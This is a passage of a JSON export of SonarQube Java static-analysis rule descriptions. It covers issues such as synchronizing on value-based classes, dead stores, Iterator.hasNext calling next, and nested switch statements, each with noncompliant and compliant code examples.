 moveWindowToTheBackground();\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nif (param == 1)\n  openWindow();\nelse if (param == 2)\n  closeWindow();\nelse if (param == 3)\n  moveWindowToTheBackground();\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1862","summary":"Related \"if/else if\" statements should not have the same condition","tags":["cert","unused","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>In Java, value-based classes are those for which instances are final and immutable, like <code>String</code>, <code>Integer</code> and so on, and\ntheir identity relies on their value and not their reference. When a variable of one of these types is instantiated, the JVM caches its value, and the\nvariable is just a reference to that value. For example, multiple <code>String</code> variables with the same value \"Hello world!\" will refer to the\nsame cached string literal in memory.</p>\n<p>The <code>synchronized</code> keyword tells the JVM to only allow the execution of the code contained in the following block to one\n<code>Thread</code> at a time. This mechanism relies on the identity of the object that is being synchronized between threads, to prevent that if\nobject X is locked, it will still be possible to lock another object Y.</p>\n<p>It means that the JVM will fail to correctly synchronize threads on instances of the aforementioned value-based classes, for instance:</p>\n<pre>\n// These variables \"a\" and \"b\" will effectively reference the same object in memory\nInteger a = 0;\nInteger b = 0;\n\n// This means that in the following code, the JVM could try to lock and execute\n// on the variable \"a\" because \"b\" was notified to be released, as the two Integer variables\n// are the same object to the JVM\nvoid syncMethod(int x) {\n    synchronized (a) {\n        if (a == x) {\n        // ... do something here\n        }\n    }\n    synchronized (b) {\n        if (b == x) {\n        // ... do something else\n        }\n    }\n}\n</pre>\n<p>This behavior can cause unrelated threads to deadlock with unclear stacktraces.</p>\n<p>Within the JDK, types which should not be used for synchronization include:</p>\n<ul>\n  <li> <code>String</code> literals </li>\n  <li> Primitive wrapper classes in <code>java.lang</code> (such as <code>Boolean</code> with <code>Boolean.FALSE</code> and\n  <code>Boolean.TRUE</code>) </li>\n  <li> The class <code>java.lang.Runtime.Version</code> </li>\n  <li> The <code>Optional*</code> classes in <code>java.util</code>: <code>Optional</code>, <code>OptionalInt</code>, <code>OptionalLong</code>, and\n  <code>OptionalDouble</code> </li>\n  <li> Various classes in the <code>java.time</code> API: <code>Instant</code>, <code>LocalDate</code>, <code>LocalTime</code>,\n  <code>LocalDateTime</code>, <code>ZonedDateTime</code>, <code>ZoneId</code>, <code>OffsetTime</code>, <code>OffsetDateTime</code>,\n  <code>ZoneOffset</code>, <code>Duration</code>, <code>Period</code>, <code>Year</code>, <code>YearMonth</code>, and <code>MonthDay</code> </li>\n  <li> Various classes in the <code>java.time.chrono</code> API: <code>MinguoDate</code>, <code>HijrahDate</code>, <code>JapaneseDate</code>, and\n  <code>ThaiBuddhistDate</code> </li>\n  <li> The interface <code>java.lang.ProcessHandle</code> and its implementation classes </li>\n  <li> The implementation classes of the collection factories in <code>java.util</code>: <code>List.of</code>, <code>List.copyOf</code>,\n  <code>Set.of</code>, <code>Set.copyOf</code>, <code>Map.of</code>, <code>Map.copyOf</code>, <code>Map.ofEntries</code>, and <code>Map.entry</code>.\n  </li>\n</ul>\n<h2>How to fix it</h2>\n<p>Replace instances of value-based classes with a new object instance to synchronize on.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprivate static final Boolean bLock = Boolean.FALSE;\nprivate static final Integer iLock = Integer.valueOf(0);\nprivate static final String sLock = \"LOCK\";\nprivate static final List&lt;String&gt; listLock = List.of(\"a\", \"b\", \"c\", \"d\");\n\npublic void doSomething() {\n\n  synchronized(bLock) {  // Noncompliant\n      ...\n  }\n  synchronized(iLock) {  // Noncompliant\n      ...\n  }\n  synchronized(sLock) {  // Noncompliant\n      ...\n  }\n  synchronized(listLock) {  // Noncompliant\n      ...\n  }\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprivate static final Object lock1 = new Object();\nprivate static final Integer iLock = new Integer(42);\nprivate static final String sLock = new String(\"A brand new string in memory!\");\nprivate static final List&lt;String&gt; listLock = new ArrayList&lt;&gt;();\n\npublic void doSomething() {\n\n  synchronized(lock1) { // Compliant\n      ...\n  }\n  synchronized(iLock) { // Compliant\n      ...\n  }\n  synchronized(sLock) { // Compliant\n      ...\n  }\n  synchronized(listLock) { // Compliant\n      ...\n  }\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CERT - <a href=\"https://wiki.sei.cmu.edu/confluence/x/1zdGBQ\">Do not synchronize on objects that may be reused</a> </li>\n  <li> OpenJDK - <a href=\"https://openjdk.java.net/jeps/390\">JEP 390: Warnings for Value-Based Classes</a> </li>\n  <li> Java Documentation - <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/doc-files/ValueBased.html\">Value-based\n  Classes</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1860","summary":"Synchronization should not be done on instances of value-based classes","tags":["multi-threading","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Invoking a method designed to return a string representation of an object which is already a string is a waste of keystrokes. This redundant\nconstruction may be optimized by the compiler, but will be confusing in the meantime.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nString message = \"hello world\";\nSystem.out.println(message.toString()); // Noncompliant;\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nString message = \"hello world\";\nSystem.out.println(message);\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1858","summary":"\"toString()\" should never be called on a String object","tags":["finding","clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Dead stores refer to assignments made to local variables that are subsequently never used or immediately overwritten. Such assignments are\nunnecessary and donât contribute to the functionality or clarity of the code. They may even negatively impact performance. Removing them enhances code\ncleanliness and readability. Even if the unnecessary operations do not do any harm in terms of the programâs correctness, they are - at best - a waste\nof computing resources.</p>\n<h3>Exceptions</h3>\n<p>This rule ignores initializations to <code>-1</code>, <code>0</code>, <code>1</code>, <code>null</code>, <code>true</code>, <code>false</code> and\n<code>\"\"</code>.</p>\n<h2>How to fix it</h2>\n<p>Remove the unnecessary assignment, then test the code to make sure that the right-hand side of a given assignment had no side effects (e.g. a\nmethod that writes certain data to a file and returns the number of written bytes).</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nint foo(int y) {\n  int x = 100; // Noncompliant: dead store\n  x = 150;     // Noncompliant: dead store\n  x = 200;\n  return x + y;\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nint foo(int y) {\n  int x = 200; // Compliant: no unnecessary assignment\n  return x + y;\n}\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/563\">CWE-563 - Assignment to Variable without Use ('Unused Variable')</a> </li>\n</ul>\n<h3>Related rules</h3>\n<ul>\n  <li> {rule:java:S2583} - Conditionally executed code should be reachable </li>\n  <li> {rule:java:S2589} - Boolean expressions should not be gratuitous </li>\n  <li> {rule:java:S3516} - Methods returns should not be invariant </li>\n  <li> {rule:java:S3626} - Jump statements should not be redundant </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1854","summary":"Unused assignments should be removed","tags":["cwe","cert","unused"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Calling <code>Iterator.hasNext()</code> is not supposed to have any side effects and hence should not change the iteratorâs state.\n<code>Iterator.next()</code> advances the iterator by one item. So calling it inside <code>Iterator.hasNext()</code> breaks the <code>hasNext()</code>\ncontract and will lead to unexpected behavior in production.</p>\n<h2>How to fix it</h2>\n<p>How to fix this issue strongly depends on the specific implementation of the iterator. Make sure that the logic of the <code>hasNext()</code>\nimplementation does not change the state of the iterator or any underlying data sources. Instead, it should merely return state information.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass MyIterator implements Iterator&lt;Integer&gt; {\n\n  private Queue&lt;Integer&gt; elements;\n\n    ...\n\n  @Override\n  public boolean hasNext() {\n    try {\n      next(); // Noncompliant, next() is called from hasNext()\n      return true;\n    } catch (NoSuchElementException e) {\n      return false;\n    }\n  }\n\n  @Override\n  public Integer next() {\n    return elements.remove();\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass MyIterator implements Iterator&lt;Integer&gt; {\n\n  private Queue&lt;Integer&gt; elements;\n\n    ...\n\n  @Override\n  public boolean hasNext() {\n    return !elements.isEmpty(); // Compliant, no call to next()\n  }\n\n  @Override\n  public Integer next() {\n    return elements.remove();\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/Iterator.html\">Interface Iterator&lt;E&gt; - JavaÂ® Platform SE\n  11 API Specification</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1849","summary":"\"Iterator.hasNext()\" should not call \"Iterator.next()\"","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<p>This rule raises an issue when there is a method and a field in a class with names that differ only by capitalization.</p>\n<h2>Why is this an issue?</h2>\n<p>Looking at the set of methods in a class, including superclass methods, and finding two methods or fields that differ only by capitalization is\nconfusing to users of the class. It is similarly confusing to have a method and a field which differ only in capitalization or a method and a field\nwith exactly the same name and visibility.</p>\n<p>In the case of methods, it may have been a mistake on the part of the original developer, who intended to override a superclass method, but instead\nadded a new method with nearly the same name.</p>\n<p>Otherwise, this situation simply indicates poor naming. Method names should be action-oriented, and thus contain a verb, which is unlikely in the\ncase where both a method and a member have the same name (with or without capitalization differences). However, renaming a public method could be\ndisruptive to callers. Therefore renaming the member is the recommended action.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Car{\n\n  public DriveTrain drive;\n\n  public void tearDown(){...}\n\n  public void drive() {...}  // Noncompliant; duplicates field name\n}\n\npublic class MyCar extends Car{\n  public void teardown(){...}  // Noncompliant; not an override. It it really what's intended?\n\n  public void drivefast(){...}\n\n  public void driveFast(){...} //Huh?\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Car{\n\n  private DriveTrain drive;\n\n  public void tearDown(){...}\n\n  public void drive() {...}  // field visibility reduced\n}\n\npublic class MyCar extends Car{\n  @Override\n  public void tearDown(){...}\n\n  public void drivefast(){...}\n\n  public void driveReallyFast(){...}\n\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1845","summary":"Methods and field names should not be the same or differ only by capitalization","tags":["confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The <code>java.util.concurrent.locks.Condition</code> interface provides an alternative to the <code>Object</code> monitor methods\n(<code>wait</code>, <code>notify</code> and <code>notifyAll</code>). Hence, the purpose of implementing said interface is to gain access to its more\nnuanced <code>await</code> methods.</p>\n<p>Consequently, calling the method <code>Object.wait</code> on a class implementing the <code>Condition</code> interface is contradictory and should\nbe avoided. Use <code>Condition.await</code> instead.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nvoid doSomething(Condition condition) {\n    condition.wait(); // Noncompliant, Object.wait is called\n\n        ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nvoid doSomething(Condition condition) {\n    condition.await(); // Compliant, Condition.await is called\n\n        ...\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/concurrent/locks/Condition.html\">Interface Condition - Javaâ¢ Platform SE 8, API\n  Specification</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1844","summary":"\"Object.wait\" should not be called on objects that implement \"java.util.concurrent.locks.Condition\"","tags":["suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Nested <code>switch</code> structures are difficult to understand because you can easily confuse the cases of an inner <code>switch</code> as\nbelonging to an outer statement or expression. Therefore nested <code>switch</code> statements and expressions should be avoided.</p>\n<p>Specifically, you should structure your code to avoid the need for nested <code>switch</code> statements or expressions, but if you cannot, then\nconsider moving the inner <code>switch</code> to another method.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nvoid foo(int n, int m) {\n  switch (n) {\n    case 0:\n      switch (m) {  // Noncompliant; nested switch\n        // ...\n      }\n    case 1:\n      // ...\n    default:\n      // ...\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nvoid foo(int n, int m) {\n  switch (n) {\n    case 0:\n      bar(m);\n    case 1:\n      // ...\n    default:\n      // ...\n  }\n}\n\nvoid bar(int m){\n  switch(m) {\n    // ...\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1821","summary":"\"switch\" statements and expressions should not be nested","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A class that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain, and\nhaving a lot of fields is an indication that a class has grown too large.</p>\n<p>Above a specific threshold, it is strongly advised to refactor the class into smaller ones which focus on well defined topics.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"infeasible","ruleKey":"RSPEC-1820","summary":"Classes should not have too many fields","tags":["brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Ternary expressions, while concise, can often lead to code that is difficult to read and understand, especially when they are nested or complex.\nPrioritizing readability fosters maintainability and reduces the likelihood of bugs. Therefore, they should be removed in favor of more explicit\ncontrol structures, such as <code>if</code>/<code>else</code> statements, to improve the clarity and readability of the code.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre>\nSystem.out.println(i&gt;10?\"yes\":\"no\");  // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre>\nif (i &gt; 10) {\n  System.out.println(\"yes\");\n} else {\n  System.out.println(\"no\");\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1774","summary":"The ternary operator should not be used","tags":["brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Using the same value on both sides of a binary operator is a code defect. In the case of logical operators, it is either a copy/paste error and,\ntherefore, a bug, or it is simply duplicated code and should be simplified. In the case of bitwise operators and most binary mathematical operators,\nhaving the same value on both sides of an operator yields predictable results and should be simplified as well.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nif ( a == a ) { // always true\n  doZ();\n}\nif ( a != a ) { // always false\n  doY();\n}\nif ( a == b &amp;&amp; a == b ) { // if the first one is true, the second one is too\n  doX();\n}\nif ( a == b || a == b ) { // if the first one is true, the second one is too\n  doW();\n}\n\nint j = 5 / 5; //always 1\nint k = 5 - 5; //always 0\n\nc.equals(c); //always true\n</pre>\n<h3>Exceptions</h3>\n<ul>\n  <li> This rule ignores <code>*</code>, <code>+</code>, and <code>=</code>. </li>\n  <li> The specific case of testing a floating point value against itself is a valid test for <code>NaN</code> and is therefore ignored. </li>\n  <li> Similarly, left-shifting 1 onto 1 is common in the construction of bit masks, and is ignored. </li>\n</ul>\n<pre>\nfloat f;\nif(f != f) { //test for NaN value\n  System.out.println(\"f is NaN\");\n}\n\nint i = 1 &lt;&lt; 1; // Compliant\nint j = a &lt;&lt; a; // Noncompliant\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n  <li> {rule:java:S1656} - Implements a check on <code>=</code>. </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1764","summary":"Identical expressions should not be used on both sides of a binary operator","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A loop with at most one iteration is equivalent to an <code>if</code> statement. This can confuse developers and make the code less readable since\nloops are not meant to replace <code>if</code> statements.</p>\n<p>If the intention was to conditionally execute the block only once, an <code>if</code> statement should be used instead. Otherwise, the loop should\nbe fixed so the loop block can be executed multiple times.</p>\n<p>A loop statement with at most one iteration can happen when a statement that unconditionally transfers control, such as a jump or throw statement,\nis misplaced inside the loop block.</p>\n<p>This rule arises when the following statements are misplaced:</p>\n<ul>\n  <li> <code>break</code> </li>\n  <li> <code>return</code> </li>\n  <li> <code>throw</code> </li>\n</ul>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nint i = 0;\nwhile(i &lt; 10) { // Noncompliant; loop only executes once\n  System.out.println(\"i is \" + i);\n  i++;\n  break;\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nfor (int i = 0; i &lt; 10; i++) { // Noncompliant; loop only executes once\n  if (i == x) {\n    break;\n  } else {\n    System.out.println(\"i is \" + i);\n    return;\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nint i = 0;\nwhile (i &lt; 10) {\n  System.out.println(\"i is \" + i);\n  i++;\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nfor (int i = 0; i &lt; 10; i++) {\n  if (i == x) {\n    break;\n  } else {\n    System.out.println(\"i is \" + i);\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/java/nutsandbolts/for.html\">Oracle - The for Statement</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1751","summary":"Loops with at most one iteration should be refactored","tags":["confusing","bad-practice"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Just as there is little justification for writing your own String class, there is no good reason to re-define one of the existing, standard\nfunctional interfaces.</p>\n<p>Doing so may seem tempting, since it would allow you to specify a little extra context with the name. But in the long run, it will be a source of\nconfusion, because maintenance programmers will wonder what is different between the custom functional interface and the standard one.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@FunctionalInterface\npublic interface MyInterface { // Noncompliant\n\tdouble toDouble(int a);\n}\n\n@FunctionalInterface\npublic interface ExtendedBooleanSupplier { // Noncompliant\n  boolean get();\n  default boolean isFalse() {\n    return !get();\n  }\n}\n\npublic class MyClass {\n    private int a;\n    public double myMethod(MyInterface instance){\n\treturn instance.toDouble(a);\n    }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@FunctionalInterface\npublic interface ExtendedBooleanSupplier extends BooleanSupplier { // Compliant, extends java.util.function.BooleanSupplier\n  default boolean isFalse() {\n    return !getAsBoolean();\n  }\n}\n\npublic class MyClass {\n    private int a;\n    public double myMethod(IntToDoubleFunction instance){\n\treturn instance.applyAsDouble(a);\n    }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1711","summary":"Standard functional interfaces should not be redefined","tags":["java8"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Before Java 8, a container annotation was required as wrapper to use multiple instances of the same annotation. As of Java 8, this is no longer\nnecessary. Instead, these annotations should be used directly without a wrapper, resulting in cleaner and more readable code.</p>\n<p>This rule is automatically disabled when the projectâs <code>sonar.java.source</code> is lower than <code>8</code> as repeating annotations were\nintroduced in Java 8.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@SomeAnnotations({  // Noncompliant, wrapper annotations are not necessary in Java 8+\n  @SomeAnnotation(..a..),\n  @SomeAnnotation(..b..),\n  @SomeAnnotation(..c..),\n})\npublic class SomeClass {\n  ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@SomeAnnotation(..a..)\n@SomeAnnotation(..b..)\n@SomeAnnotation(..c..)\npublic class SomeClass {\n  ...\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/java/annotations/repeating.html\">Repeating Annotations - The Javaâ¢ Tutorials</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1710","summary":"Annotation repetitions should not be wrapped","tags":["java8"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Itâs confusing to have a class member with the same name (case differences aside) as its enclosing class. This is particularly so when you consider\nthe common practice of naming a class instance for the class itself.</p>\n<p>Best practice dictates that any field or member with the same name as the enclosing class be renamed to be more descriptive of the particular\naspect of the class it represents or holds.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Foo {\n  private String foo;\n\n  public String getFoo() { }\n}\n\nFoo foo = new Foo();\nfoo.getFoo() // what does this return?\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class Foo {\n  private String name;\n\n  public String getName() { }\n}\n\n//...\n\nFoo foo = new Foo();\nfoo.getName()\n</pre>\n<h3>Exceptions</h3>\n<p>When the type of the field is the containing class and that field is static, no issue is raised to allow singletons named like the type.</p>\n<pre>\npublic class Foo {\n  ...\n  private static Foo foo;\n  public Foo getInstance() {\n    if(foo==null) {\n      foo = new Foo();\n    }\n    return foo;\n  }\n  ...\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1700","summary":"A field should not duplicate the name of its containing class","tags":["brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Calling an overridable method from a constructor could result in failures or strange behaviors when instantiating a subclass which overrides the\nmethod.</p>\n<p>For example:</p>\n<ul>\n  <li> The subclass class constructor starts by contract by calling the parent class constructor. </li>\n  <li> The parent class constructor calls the method, which has been overridden in the child class. </li>\n  <li> If the behavior of the child class method depends on fields that are initialized in the child class constructor, unexpected behavior (like a\n  <code>NullPointerException</code>) can result, because the fields arenât initialized yet. </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Parent {\n\n  public Parent () {\n    doSomething();  // Noncompliant\n  }\n\n  public void doSomething () {  // not final; can be overridden\n    ...\n  }\n}\n\npublic class Child extends Parent {\n\n  private String foo;\n\n  public Child(String foo) {\n    super(); // leads to call doSomething() in Parent constructor which triggers a NullPointerException as foo has not yet been initialized\n    this.foo = foo;\n  }\n\n  public void doSomething () {\n    System.out.println(this.foo.length());\n  }\n\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/8zZGBQ\">CERT, MET05-J.</a> - Ensure that constructors do not call overridable methods </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/6ns-BQ\">CERT, OOP50-CPP.</a> - Do not invoke virtual functions from constructors or destructors\n  </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"infeasible","ruleKey":"RSPEC-1699","summary":"Constructors should only call non-overridable methods","tags":["cert","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>It is equivalent to use the equality <code>==</code> operator and the <code>equals</code> method to compare two objects if the <code>equals</code>\nmethod inherited from <code>Object</code> has not been overridden. In this case both checks compare the object references.</p>\n<p>But as soon as <code>equals</code> is overridden, two objects not having the same reference but having the same value can be equal. This rule spots\nsuspicious uses of <code>==</code> and <code>!=</code> operators on objects whose <code>equals</code> methods are overridden.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nString firstName = getFirstName(); // String overrides equals\nString lastName = getLastName();\n\nif (firstName == lastName) { ... }; // Non-compliant; false even if the strings have the same value\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nString firstName = getFirstName();\nString lastName = getLastName();\n\nif (firstName != null &amp;&amp; firstName.equals(lastName)) { ... };\n</pre>\n<h3>Exceptions</h3>\n<p>Comparing two instances of the <code>Class</code> object will not raise an issue:</p>\n<pre>\nClass c;\nif(c == Integer.class) { // No issue raised\n}\n</pre>\n<p>Comparing <code>Enum</code> will not raise an issue:</p>\n<pre>\npublic enum Fruit {\n   APPLE, BANANA, GRAPE\n}\npublic boolean isFruitGrape(Fruit candidateFruit) {\n  return candidateFruit == Fruit.GRAPE; // it's recommended to activate S4551 to enforce comparison of Enums using ==\n}\n</pre>\n<p>Comparing with <code>final</code> reference will not raise an issue:</p>\n<pre>\nprivate static final Type DEFAULT = new Type();\n\nvoid foo(Type other) {\n  if (other == DEFAULT) { // Compliant\n  //...\n  }\n}\n</pre>\n<p>Comparing with <code>this</code> will not raise an issue:</p>\n<pre>\n  public boolean equals(Object other) {\n    if (this == other) {  // Compliant\n      return false;\n    }\n }\n</pre>\n<p>Comparing with <code>java.lang.String</code> and boxed types <code>java.lang.Integer</code>, â¦â will not raise an 